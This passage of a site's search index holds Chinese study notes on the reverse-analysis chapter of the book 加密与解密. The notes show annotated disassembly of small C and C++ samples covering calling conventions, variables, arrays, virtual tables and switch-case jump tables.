1C204100 mov dword ptr ds:[eax],offset Calling_.C\n\n  00401045   .  8BF0          mov esi,eax\n  00401047   .  EB 02         jmp XCalling_.0040104B\n  00401049   \n  33F6          xor esi,esi\n  0040104B   \n  8B06          mov eax,dword ptr ds:[esi]\n  0040104D   .  6A 02         push 0x2\n  0040104F   .  6A 01         push 0x1\n  00401051   .  8BCE          mov ecx,esi\n  00401053   .  FF10          call dword ptr ds:[eax]\n  00401055   .  8B16          mov edx,dword ptr ds:[esi]\n  00401057   .  6A 02         push 0x2\n  00401059   .  6A 01         push 0x1\n  0040105B   .  8BCE          mov ecx,esi\n  0040105D   .  FF52 04       call dword ptr ds:[edx+0x4]\n  00401060   .  5E            pop esi\n  00401061   .  C3            retn\n\n\nmov ecx,esi\n中，ecx保存了 ==this指针==，但是从汇编代码上看，没看出this指针的作用\n\n\nvtbl中的数据：\n\n\n0041201C \n05 10 40 00 0F 10 40 00  \u0005\u0010@.\u000f\u0010@.\n\n\nadd函数：\n\n\nasm\n  00401080 \n \n \\8B4424 08     mov eax,dword ptr ss:[esp+0x8]\n  00401084   .  8B4C24 04     mov ecx,dword ptr ss:[esp+0x4]\n  00401088   .  03C1          add eax,ecx\n  0040108A   .  C2 0800       retn 0x8\n\n\nsub函数：\n\n\nasm\n  004010A0 \n \n \\8B4424 04     mov eax,dword ptr ss:[esp+0x4]\n  004010A4   .  8B4C24 08     mov ecx,dword ptr ss:[esp+0x8]\n  004010A8   .  2BC1          sub eax,ecx\n  004010AA   .  C2 0800       retn 0x8\n\n\n4.5  控制语句\n\n\n4.5.1  IF-THEN-ELSE语句\n\n\n\n\n\n\n汇编代码\n\n\n\n\n\n\n整数\n\n\n\n\ncmp \n\n\n\n\na-b\n的结果，影响ZF/进位/符号位/溢出标志\n\n\nasm\n  cmp a,b\n  jz（jnz） xxxx\n\n\n\n\ntest\n\n\n\n\na \nb\n a和b逻辑与的结果，结果为0，ZF置1\n\n\n\n\nor\n\n\n\n\n\n\n\n\n00401010   push        ecx\n11:        int a,b=5;\n12:   scanf(\n%d\n,\na);\n00401011   lea         eax,[esp]\n00401015   push        eax\n00401016   push        offset string \n%d\n (00416a30)\n0040101B   call        scanf (00401050)\n13:        if(a==0)\n00401020   mov         eax,dword ptr [esp+8]\n00401024   add         esp,8\n00401027   test        eax,eax\n00401029   jne         main+20h (00401030)\n14:            a=8;\n0040102B   mov         eax,8\n15:\n16:\n17:        return a+b;\n00401030   add         eax,5\n18:    }\n00401033   pop         ecx\n00401034   ret\n\n\n\n\n\n4.5.2  SWITCH-CASE语句\n\n\n\n\n没有优化的情况下，编译：\n\n\n\n\n00401010   push        ebp\n00401011   mov         ebp,esp\n00401013   sub         esp,8\n00401016   mov         dword ptr [ebp-8],0CCCCCCCCh\n0040101D   mov         dword ptr [ebp-4],0CCCCCCCCh\n11:        int a;\n12:        scanf(\n%d\n,\na);\n00401024   lea         eax,[a]\n00401027   push        eax\n00401028   push        offset ___xt_z+104h (00417a30)\n0040102D   call        scanf (00401140)\n00401032   add         esp,8\n13:\n14:        switch(a)\n15:        {\n00401035   mov         ecx,dword ptr [a]\n00401038   mov         dword ptr [ebp-8],ecx\n0040103B   cmp         dword ptr [ebp-8],1  ;case 1\n0040103F   je          main+3Fh (0040104f)  \n00401041   cmp         dword ptr [ebp-8],2  ;case 2\n00401045   je          main+4Eh (0040105e)\n00401047   cmp         dword ptr [ebp-8],0Ah    ;case 10\n0040104B   je          main+5Dh (0040106d)\n0040104D   jmp         main+6Ch (0040107c)\n16:           case 1 :printf(\na=1\n);\n0040104F   push        offset ___xt_z+108h (00417a34)\n00401054   call        printf (004010c0)\n00401059   add         esp,4\n17:                       break;\n0040105C   jmp         main+79h (00401089)\n18:           case 2 :printf(\na=2\n);\n0040105E   push        offset ___xt_z+10Ch (00417a38)\n00401063   call        printf (004010c0)\n00401068   add         esp,4\n19:                       break;\n0040106B   jmp         main+79h (00401089)\n20:           case 10:printf(\na=10\n);\n0040106D   push        offset ___xt_z+110h (00417a3c)\n00401072   call        printf (004010c0)\n00401077   add         esp,4\n21:                       break;\n0040107A   jmp         main+79h (00401089)\n22:           default :printf(\na=default\n);\n0040107C   push        offset ___xt_z+118h (00417a44)\n00401081   call        printf (004010c0)\n00401086   add         esp,4\n23:                        break;\n24:        }\n25:\n26:        return 0;\n00401089   xor         eax,eax\n\n\n\n\n\n\n设置了最大速度的情况下，编译：\n\n\n\n\n9:    int main(void)\n10:    {\n0040F9A0   push        ecx  ;为局部变量分配内存，相当于sub esp,4\n11:        int a;\n12:        scanf(\n%d\n,\na);\n0040F9A1   lea         eax,[esp]\n0040F9A5   push        eax\n0040F9A6   push        offset string \n%d\n (00417d1c)\n0040F9AB   call        scanf (00401140)\n13:\n14:        switch(a)\n15:        {\n0040F9B0   mov         eax,dword ptr [esp+8]\n0040F9B4   add         esp,8\n0040F9B7   dec         eax  ;检查eax是否为1，如果是，下一句就跳转\n0040F9B8   je          main+55h (0040f9f5)  ;相当于case 1\n0040F9BA   dec         eax  ;eax再减1，即原来的eax是2\n0040F9BB   je          main+44h (0040f9e4)  ;相当于 case 2\n0040F9BD   sub         eax,8                ;原来的值为10\n0040F9C0   je          main+33h (0040f9d3)  ;case 10\n21:                       break;\n22:           default :printf(\na=default\n);\n0040F9C2   push        offset string \na=default\n (0041a358)\n0040F9C7   call        printf (004010c0)\n0040F9CC   add         esp,4\n23:                        break;\n24:        }\n25:\n26:        return 0;\n0040F9CF   xor         eax,eax\n27:    }\n0040F9D1   pop         ecx\n0040F9D2   ret\n19:                       break;\n20:           case 10:printf(\na=10\n);\n0040F9D3   push        offset string \na=10\n (00417e94)\n0040F9D8   call        printf (004010c0)\n0040F9DD   add         esp,4\n23:                        break;\n24:        }\n25:\n26:        return 0;\n0040F9E0   xor         eax,eax\n27:    }\n0040F9E2   pop         ecx\n0040F9E3   ret\n17:                       break;\n18:           case 2 :printf(\na=2\n);\n0040F9E4   push        offset string \na=2\n (00417a64)\n0040F9E9   call        printf (004010c0)\n0040F9EE   add         esp,4\n23:                        break;\n24:        }\n25:\n26:        return 0;\n0040F9F1   xor         eax,eax\n27:    }\n0040F9F3   pop         ecx\n0040F9F4   ret\n16:           case 1 :printf(\na=1\n);\n0040F9F5   push        offset string \na=1\n (00417a50)\n0040F9FA   call        printf (004010c0)\n0040F9FF   add         esp,4\n23:                        break;\n24:        }\n25:\n26:        return 0;\n0040FA02   xor         eax,eax\n27:    }\n0040FA04   pop         ecx\n0040FA05   ret\n\n\n\n\n\n\n\n当case取值表示一个算术级数，编译器会利用一个跳转表来实现\n\n\n\n\n注：使用vc6.0调试，产生的调试信息，但是有一处注释有明显的问题，\ncase 1\n下面是没有defualt语句的，但是vc的注释却显示了\ndefault :printf(\"a=default\");\n，这里需要注意\n\n\n   int main(void)\n11:    {\n00401010 51                   push        ecx\n12:        int a;\n13:        scanf(\n%d\n,\na);\n00401011 8D 44 24 00          lea         eax,[esp]\n00401015 50                   push        eax\n00401016 68 58 7A 41 00       push        offset string \n%d\n (00417a58)\n0040101B E8 80 01 00 00       call        scanf (004011a0)\n14:\n15:        switch(a)\n16:        {\n00401020 8B 4C 24 08          mov         ecx,dword ptr [esp+8]\n00401024 83 C4 08             add         esp,8\n00401027 8D 41 FF             lea         eax,[ecx-1]\n0040102A 83 F8 06             cmp         eax,6 ;判断是否为default节点\n0040102D 77 7E                ja          $L545+11h (004010ad)\n0040102F FF 24 85 C0 10 40 00 jmp         dword ptr [eax*4+4010C0h] ;跳转表\n17:           case 1 :printf(\na=1\n);\n00401036 68 54 7A 41 00       push        offset string \na=1\n (00417a54)\n30:                       break;\n31:\n32:           default :printf(\na=default\n);\n0040103B E8 E0 00 00 00       call        printf (00401120)\n00401040 83 C4 04             add         esp,4\n33:                        break;\n34:        }\n35:\n36:        return 0;\n00401043 33 C0                xor         eax,eax\n37:    }\n00401045 59                   pop         ecx\n00401046 C3                   ret\n18:                       break;\n19:           case 2 :printf(\na=2\n);\n00401047 68 50 7A 41 00       push        offset string \na=2\n (00417a50)\n30:                       break;\n31:\n32:           default :printf(\na=default\n);\n0040104C E8 CF 00 00 00       call        printf (00401120)\n00401051 83 C4 04             add         esp,4\n33:                        break;\n34:        }\n35:\n36:        return 0;\n00401054 33 C0                xor         eax,eax\n37:    }\n00401056 59                   pop         ecx\n00401057 C3                   ret\n20:                       break;\n...//省略掉类似的内容\n31:\n32:           default :printf(\na=default\n);\n004010AD 68 30 7A 41 00       push        offset string \na=default\n (00417a30)\n004010B2 E8 69 00 00 00       call        printf (00401120)\n004010B7 83 C4 04             add         esp,4\n33:                        break;\n34:        }\n35:\n36:        return 0;\n004010BA 33 C0                xor         eax,eax\n37:    }\n004010BC 59                   pop         ecx\n004010BD C3                   ret\n004010BE 8B FF                mov         edi,edi\n004010C0 36 10 40 00          adc         byte ptr ss:[eax],al\n004010C4 47                   inc         edi\n004010C5 10 40 00             adc         byte ptr [eax],al\n004010C8 58                   pop         eax\n004010C9 10 40 00             adc         byte ptr [eax],al\n004010CC 69 10 40 00 7A 10    imul        edx,dword ptr [eax],107A0040h\n004010D2 40                   inc         eax\n004010D3 00 8B 10 40 00 9C    add         byte ptr [ebx-63FFBFF0h],cl\n004010D9 10 40 00             adc         byte ptr [eax],al\n\n\n\n\n4.5.3  转移指令机器码的计算\n\n\n\n\n4.5.4  条件设置指令（SETcc） 91\n\n\n4.5.5  纯算法实现逻辑判断 92\n\n\n4.6  循环语句 93\n\n\n4.7  数学运算符 94\n\n\n4.7.1  整数的加法和减法 94\n\n\n4.7.2  整数的乘法 94\n\n\n4.7.3  整数的除法 95\n\n\n4.8  文本字符串 97\n\n\n4.8.1  字符串存储格式 97\n\n\n4.8.2  字符寻址指令 98\n\n\n4.8.3  字母大小写转换 98\n\n\n4.8.4  计算字符串的长度 99\n\n\n4.9  指令修改技巧 99", 
            "title": "加密与解密 第四章 逆向分析技术"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#4", 
            "text": "", 
            "title": "第4章 逆向分析技术"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#41", 
            "text": "c/c++运行时启动函数作用  检索指向新进程的命令行指针  检索指向新进程的环境变量指针  全局变量初始化  内存堆栈初始化   00401020  /$  55            push    ebp\n00401021  |.  8BEC          mov     ebp, esp\n00401023  |.  6A FF         push    -1\n00401025  |.  68 A0504000   push    004050A0\n0040102A  |.  68 7C1C4000   push    00401C7C                         ;  SE 处理程序安装\n0040102F  |.  64:A1 0000000 mov     eax, dword ptr fs:[0]\n00401035  |.  50            push    eax\n00401036  |.  64:8925 00000 mov     dword ptr fs:[0], esp\n0040103D  |.  83EC 10       sub     esp, 10\n00401040  |.  53            push    ebx\n00401041  |.  56            push    esi", 
            "title": "4.1 启动函数"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#42", 
            "text": "", 
            "title": "4.2 函数"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#421", 
            "text": "CALL  RET", 
            "title": "4.2.1 函数的识别"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#422", 
            "text": "", 
            "title": "4.2.2 函数的参数"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#_1", 
            "text": "00401000  /$  6A 04         push    4                                ; /Arg2 = 00000004\n00401002  |.  6A 03         push    3                                ; |Arg1 = 00000003\n00401004  |.  E8 16000000   call    0040101F                         ; \\Add.0040101F\n00401009  |.  8BD8          mov     ebx, eax\n0040100B  |.  6A 00         push    0                                ; /ExitCode = 0\n0040100D  \\.  FF15 00204000 call    [ KERNEL32.ExitProcess ]        ; \\ExitProcess\n\n\n0040101F  /$  55            push    ebp                              ;  保护现场原先的EBP指针\n00401020  |.  8BEC          mov     ebp, esp                         ;  设置新的EBP指针，指向栈顶\n00401022  |.  83EC 04       sub     esp, 4                           ;  分配局部变量所有空间\n00401025  |.  8B45 0C       mov     eax, [ebp+C]                     ;  调用参数2\n00401028  |.  8B5D 08       mov     ebx, [ebp+8]                     ;  调用参数1\n0040102B  |.  895D FC       mov     [ebp-4] , ebx                    ;  参数1放局部变量里\n0040102E  |.  0345 FC       add     eax,[ebp-4]                      ;  参数2与局部变量相加\n00401031  |.  83C4 04       add     esp, 4                           ;  释放局部变量所有空间\n00401034  |.  5D            pop     ebp                              ;  恢复现场的ebp指针\n00401035  \\.  C2 0800       retn    8   enter/leave   enter = push ebp/move ebp,esp/sub esp,xxx \n    leave = add esp,xxx/pop esp  asm\n  enter xxx,0   ;0表示创建xxx放局部变量\n  ...\n  leave \n  ret 8   vc6.0 使用 maximize speed   asm\n  push par2 ;参数2\n  push par1 ;参数1\n  call test2\n  {\n    move eax, dword ptr [esp+04] ;调用参数1\n      move ecx, dword ptr [esp+08] ;调用参数2\n      ...\n      ret 8\n  }", 
            "title": "利用堆栈传递"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#_2", 
            "text": "规范：__fastcall   ```c\n  / * * * * * * * * \n  *  fastcall调用                                                                                                    \n  *   (c)  看雪软件安全网站 www.pediy.com 2000-2008                         *\n   * * * * * * * * /  int  __fastcall Add(char,long,int,int);  main(void)\n   {\n        Add(1,2,3,4);\n        return 0;\n   }  int __fastcall Add(char a, long b, int c, int d)  {\n       return (a + b + c + d);\n  }  ```  vc编译：  optimizations:default", 
            "title": "利用寄存器传递变量"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#_3", 
            "text": "name mangling/name decoration  同一名字具有不同的参数或者不同的作用域  c编译时函数名修饰约定规则：  __stdcall调用约定：_{functionname}@{byte_number}  _cdel调用约定：_{functionname}  __fastcall调用约定：@{functionname}@{byte_number}", 
            "title": "名称修饰约定"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#423", 
            "text": "", 
            "title": "4.2.3 函数的返回值"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#0x1-return", 
            "text": "", 
            "title": "0x1 用return返回"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#0x2", 
            "text": "", 
            "title": "0x2 通过参数按引用方式返回"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#43", 
            "text": "", 
            "title": "4.3 数据结构"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#431", 
            "text": "利用堆栈    sub esp,8    调用格式：   局部：[ebp-xxxx]  参数调用：[ebp+xxxx]     局部变量与清除堆栈的几种形式     形式一  形式二  形式三      sub esp,n add esp,n  add esp,-n sub esp,-n  push reg pop reg       局部变量初始化   mov [ebp-04],5  push 5     利用寄存器    除了堆栈占用2个寄存器外，编译器会利用剩下的6个通用寄存器", 
            "title": "4.3.1 局部变量"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#432", 
            "text": "位于.data段中    格式：    asm\n  move eax,dword ptr [4084c0h]    作用：    传递参数    传递函数返回值    示例    ```c\n  / * * * * * * * * *\n  《加密与解密》第三版配套实例\n                                        4.3.2  全局变量\n  (c)  看雪软件安全网站 www.pediy.com 2000-2008\n   * * * * * * * * /\n  int z;  int add(int x,int y);\n  int main(void)\n   {\n     int a=5,b=6;\n     z=7;\n     add(a,b);\n     return 0;\n   }  int add(int x,int y)\n   {\n     return(x+y+z);\n   }\n  ```  vc++6.0编译，选择不优化   与静态变量类似，但静态变量只在定义这些变量的函数内有效", 
            "title": "4.3.2 全局变量"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#433", 
            "text": "实现方式：基址+变量    示例：    ```c\n  / * * * * * * * * *\n  《加密与解密》第三版配套实例\n                                        4.3.3 数组\n  (c)  看雪软件安全网站 www.pediy.com 2000-2008\n   * * * * * * * * /  #include   int main(void)\n  {\n    static int a[3]={0x11,0x22,0x33};\n      int i,s=0,b[3];\n    for(i=0;i 3;i++)\n    { \n        s=s+a[i];\n        b[i]=s;\n    }  for(i=0;i 3;i++)\n{\n    printf(\"%d\\n\",b[i]);\n}\n\nreturn 0;  }  ```  编译优化选项：最快速度，但是我build出现了错误：   Command line error D2016 : '/O2' and '/GZ' command-line options are incompatible\n执行 cl.exe 时出错.    /GZ 可以帮助捕获内存错误   /O1 或 /O2 优化开关，使程序最小或最快    既然两个选项不兼容，那么就把/GZ去掉，编译成功 :happy:   sample   asm\n  mov eax,[407030h+eax]    数组存在位置    堆栈   数据段 .data   动态内存    间接寻址一般出现在：    数组    结构赋值    [基址+寄存器]    基址可以为常量或者是寄存器", 
            "title": "4.3.3  数组"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#44", 
            "text": "虚函数的地址：在调用之前加以确定    虚函数表（Virtual Table，VTBL）：存放虚函数的引用    虚函数表指针（Virtual Table Pointer,VPTR）:指向对象中的函数    示例：    ```c\n  / * * * * * * * * *\n  《加密与解密》第三版配套实例\n                                      4.4 虚函数\n  (c)  看雪软件安全网站 www.pediy.com 2000-2008\n   * * * * * * * * /  #include  \n  class CSum\n  {\n  public:\n    virtual int Add(int a, int b) \n    {\n        return (a + b);\n    }  virtual int Sub(int a, int b )\n{\n    return (a - b);\n}  };  void main()\n  {  \n    CSum*   pCSum = new CSum ;    pCSum- Add(1,2);\npCSum- Sub(1,2);  }   ```  汇编代码：  asm\n  00401030     \\56            push esi\n  00401031   .  6A 04         push 0x4\n  00401033   .  E8 88000000   call Calling_.operator new\n  00401038   .  83C4 04       add esp,0x4\n  0040103B   .  85C0          test eax,eax\n  0040103D   .  74 0A         je XCalling_.00401049\n  0040103F   .  C700 1C204100 mov dword ptr ds:[eax],offset Calling_.C \n  00401045   .  8BF0          mov esi,eax\n  00401047   .  EB 02         jmp XCalling_.0040104B\n  00401049      33F6          xor esi,esi\n  0040104B      8B06          mov eax,dword ptr ds:[esi]\n  0040104D   .  6A 02         push 0x2\n  0040104F   .  6A 01         push 0x1\n  00401051   .  8BCE          mov ecx,esi\n  00401053   .  FF10          call dword ptr ds:[eax]\n  00401055   .  8B16          mov edx,dword ptr ds:[esi]\n  00401057   .  6A 02         push 0x2\n  00401059   .  6A 01         push 0x1\n  0040105B   .  8BCE          mov ecx,esi\n  0040105D   .  FF52 04       call dword ptr ds:[edx+0x4]\n  00401060   .  5E            pop esi\n  00401061   .  C3            retn  mov ecx,esi 中，ecx保存了 ==this指针==，但是从汇编代码上看，没看出this指针的作用  vtbl中的数据：  0041201C  05 10 40 00 0F 10 40 00  \u0005\u0010@.\u000f\u0010@.  add函数：  asm\n  00401080     \\8B4424 08     mov eax,dword ptr ss:[esp+0x8]\n  00401084   .  8B4C24 04     mov ecx,dword ptr ss:[esp+0x4]\n  00401088   .  03C1          add eax,ecx\n  0040108A   .  C2 0800       retn 0x8  sub函数：  asm\n  004010A0     \\8B4424 04     mov eax,dword ptr ss:[esp+0x4]\n  004010A4   .  8B4C24 08     mov ecx,dword ptr ss:[esp+0x8]\n  004010A8   .  2BC1          sub eax,ecx\n  004010AA   .  C2 0800       retn 0x8", 
            "title": "4.4  虚函数"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#45", 
            "text": "", 
            "title": "4.5  控制语句"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#451-if-then-else", 
            "text": "汇编代码    整数   cmp    a-b 的结果，影响ZF/进位/符号位/溢出标志  asm\n  cmp a,b\n  jz（jnz） xxxx   test   a  b  a和b逻辑与的结果，结果为0，ZF置1   or     00401010   push        ecx\n11:        int a,b=5;\n12:   scanf( %d , a);\n00401011   lea         eax,[esp]\n00401015   push        eax\n00401016   push        offset string  %d  (00416a30)\n0040101B   call        scanf (00401050)\n13:        if(a==0)\n00401020   mov         eax,dword ptr [esp+8]\n00401024   add         esp,8\n00401027   test        eax,eax\n00401029   jne         main+20h (00401030)\n14:            a=8;\n0040102B   mov         eax,8\n15:\n16:\n17:        return a+b;\n00401030   add         eax,5\n18:    }\n00401033   pop         ecx\n00401034   ret", 
            "title": "4.5.1  IF-THEN-ELSE语句"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#452-switch-case", 
            "text": "没有优化的情况下，编译：   00401010   push        ebp\n00401011   mov         ebp,esp\n00401013   sub         esp,8\n00401016   mov         dword ptr [ebp-8],0CCCCCCCCh\n0040101D   mov         dword ptr [ebp-4],0CCCCCCCCh\n11:        int a;\n12:        scanf( %d , a);\n00401024   lea         eax,[a]\n00401027   push        eax\n00401028   push        offset ___xt_z+104h (00417a30)\n0040102D   call        scanf (00401140)\n00401032   add         esp,8\n13:\n14:        switch(a)\n15:        {\n00401035   mov         ecx,dword ptr [a]\n00401038   mov         dword ptr [ebp-8],ecx\n0040103B   cmp         dword ptr [ebp-8],1  ;case 1\n0040103F   je          main+3Fh (0040104f)  \n00401041   cmp         dword ptr [ebp-8],2  ;case 2\n00401045   je          main+4Eh (0040105e)\n00401047   cmp         dword ptr [ebp-8],0Ah    ;case 10\n0040104B   je          main+5Dh (0040106d)\n0040104D   jmp         main+6Ch (0040107c)\n16:           case 1 :printf( a=1 );\n0040104F   push        offset ___xt_z+108h (00417a34)\n00401054   call        printf (004010c0)\n00401059   add         esp,4\n17:                       break;\n0040105C   jmp         main+79h (00401089)\n18:           case 2 :printf( a=2 );\n0040105E   push        offset ___xt_z+10Ch (00417a38)\n00401063   call        printf (004010c0)\n00401068   add         esp,4\n19:                       break;\n0040106B   jmp         main+79h (00401089)\n20:           case 10:printf( a=10 );\n0040106D   push        offset ___xt_z+110h (00417a3c)\n00401072   call        printf (004010c0)\n00401077   add         esp,4\n21:                       break;\n0040107A   jmp         main+79h (00401089)\n22:           default :printf( a=default );\n0040107C   push        offset ___xt_z+118h (00417a44)\n00401081   call        printf (004010c0)\n00401086   add         esp,4\n23:                        break;\n24:        }\n25:\n26:        return 0;\n00401089   xor         eax,eax   设置了最大速度的情况下，编译：   9:    int main(void)\n10:    {\n0040F9A0   push        ecx  ;为局部变量分配内存，相当于sub esp,4\n11:        int a;\n12:        scanf( %d , a);\n0040F9A1   lea         eax,[esp]\n0040F9A5   push        eax\n0040F9A6   push        offset string  %d  (00417d1c)\n0040F9AB   call        scanf (00401140)\n13:\n14:        switch(a)\n15:        {\n0040F9B0   mov         eax,dword ptr [esp+8]\n0040F9B4   add         esp,8\n0040F9B7   dec         eax  ;检查eax是否为1，如果是，下一句就跳转\n0040F9B8   je          main+55h (0040f9f5)  ;相当于case 1\n0040F9BA   dec         eax  ;eax再减1，即原来的eax是2\n0040F9BB   je          main+44h (0040f9e4)  ;相当于 case 2\n0040F9BD   sub         eax,8                ;原来的值为10\n0040F9C0   je          main+33h (0040f9d3)  ;case 10\n21:                       break;\n22:           default :printf( a=default );\n0040F9C2   push        offset string  a=default  (0041a358)\n0040F9C7   call        printf (004010c0)\n0040F9CC   add         esp,4\n23:                        break;\n24:        }\n25:\n26:        return 0;\n0040F9CF   xor         eax,eax\n27:    }\n0040F9D1   pop         ecx\n0040F9D2   ret\n19:                       break;\n20:           case 10:printf( a=10 );\n0040F9D3   push        offset string  a=10  (00417e94)\n0040F9D8   call        printf (004010c0)\n0040F9DD   add         esp,4\n23:                        break;\n24:        }\n25:\n26:        return 0;\n0040F9E0   xor         eax,eax\n27:    }\n0040F9E2   pop         ecx\n0040F9E3   ret\n17:                       break;\n18:           case 2 :printf( a=2 );\n0040F9E4   push        offset string  a=2  (00417a64)\n0040F9E9   call        printf (004010c0)\n0040F9EE   add         esp,4\n23:                        break;\n24:        }\n25:\n26:        return 0;\n0040F9F1   xor         eax,eax\n27:    }\n0040F9F3   pop         ecx\n0040F9F4   ret\n16:           case 1 :printf( a=1 );\n0040F9F5   push        offset string  a=1  (00417a50)\n0040F9FA   call        printf (004010c0)\n0040F9FF   add         esp,4\n23:                        break;\n24:        }\n25:\n26:        return 0;\n0040FA02   xor         eax,eax\n27:    }\n0040FA04   pop         ecx\n0040FA05   ret   当case取值表示一个算术级数，编译器会利用一个跳转表来实现   注：使用vc6.0调试，产生的调试信息，但是有一处注释有明显的问题， case 1 下面是没有defualt语句的，但是vc的注释却显示了 default :printf(\"a=default\"); ，这里需要注意     int main(void)\n11:    {\n00401010 51                   push        ecx\n12:        int a;\n13:        scanf( %d , a);\n00401011 8D 44 24 00          lea         eax,[esp]\n00401015 50                   push        eax\n00401016 68 58 7A 41 00       push        offset string  %d  (00417a58)\n0040101B E8 80 01 00 00       call        scanf (004011a0)\n14:\n15:        switch(a)\n16:        {\n00401020 8B 4C 24 08          mov         ecx,dword ptr [esp+8]\n00401024 83 C4 08             add         esp,8\n00401027 8D 41 FF             lea         eax,[ecx-1]\n0040102A 83 F8 06             cmp         eax,6 ;判断是否为default节点\n0040102D 77 7E                ja          $L545+11h (004010ad)\n0040102F FF 24 85 C0 10 40 00 jmp         dword ptr [eax*4+4010C0h] ;跳转表\n17:           case 1 :printf( a=1 );\n00401036 68 54 7A 41 00       push        offset string  a=1  (00417a54)\n30:                       break;\n31:\n32:           default :printf( a=default );\n0040103B E8 E0 00 00 00       call        printf (00401120)\n00401040 83 C4 04             add         esp,4\n33:                        break;\n34:        }\n35:\n36:        return 0;\n00401043 33 C0                xor         eax,eax\n37:    }\n00401045 59                   pop         ecx\n00401046 C3                   ret\n18:                       break;\n19:           case 2 :printf( a=2 );\n00401047 68 50 7A 41 00       push        offset string  a=2  (00417a50)\n30:                       break;\n31:\n32:           default :printf( a=default );\n0040104C E8 CF 00 00 00       call        printf (00401120)\n00401051 83 C4 04             add         esp,4\n33:                        break;\n34:        }\n35:\n36:        return 0;\n00401054 33 C0                xor         eax,eax\n37:    }\n00401056 59                   pop         ecx\n00401057 C3                   ret\n20:                       break;\n...//省略掉类似的内容\n31:\n32:           default :printf( a=default );\n004010AD 68 30 7A 41 00       push        offset string  a=default  (00417a30)\n004010B2 E8 69 00 00 00       call        printf (00401120)\n004010B7 83 C4 04             add         esp,4\n33:                        break;\n34:        }\n35:\n36:        return 0;\n004010BA 33 C0                xor         eax,eax\n37:    }\n004010BC 59                   pop         ecx\n004010BD C3                   ret\n004010BE 8B FF                mov         edi,edi\n004010C0 36 10 40 00          adc         byte ptr ss:[eax],al\n004010C4 47                   inc         edi\n004010C5 10 40 00             adc         byte ptr [eax],al\n004010C8 58                   pop         eax\n004010C9 10 40 00             adc         byte ptr [eax],al\n004010CC 69 10 40 00 7A 10    imul        edx,dword ptr [eax],107A0040h\n004010D2 40                   inc         eax\n004010D3 00 8B 10 40 00 9C    add         byte ptr [ebx-63FFBFF0h],cl\n004010D9 10 40 00             adc         byte ptr [eax],al", 
            "title": "4.5.2  SWITCH-CASE语句"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#453", 
            "text": "", 
            "title": "4.5.3  转移指令机器码的计算"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#454-setcc-91", 
            "text": "", 
            "title": "4.5.4  条件设置指令（SETcc） 91"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#455-92", 
            "text": "", 
            "title": "4.5.5  纯算法实现逻辑判断 92"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#46-93", 
            "text": "", 
            "title": "4.6  循环语句 93"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#47-94", 
            "text": "", 
            "title": "4.7  数学运算符 94"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#471-94", 
            "text": "", 
            "title": "4.7.1  整数的加法和减法 94"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#472-94", 
            "text": "", 
            "title": "4.7.2  整数的乘法 94"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#473-95", 
            "text": "", 
            "title": "4.7.3  整数的除法 95"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#48-97", 
            "text": "", 
            "title": "4.8  文本字符串 97"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#481-97", 
            "text": "", 
            "title": "4.8.1  字符串存储格式 97"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#482-98", 
            "text": "", 
            "title": "4.8.2  字符寻址指令 98"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#483-98", 
            "text": "", 
            "title": "4.8.3  字母大小写转换 98"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#484-99", 
            "text": "", 
            "title": "4.8.4  计算字符串的长度 99"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第四章-逆向分析技术/#49-99", 
            "text": "", 
            "title": "4.9  指令修改技巧 99"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/目录/", 
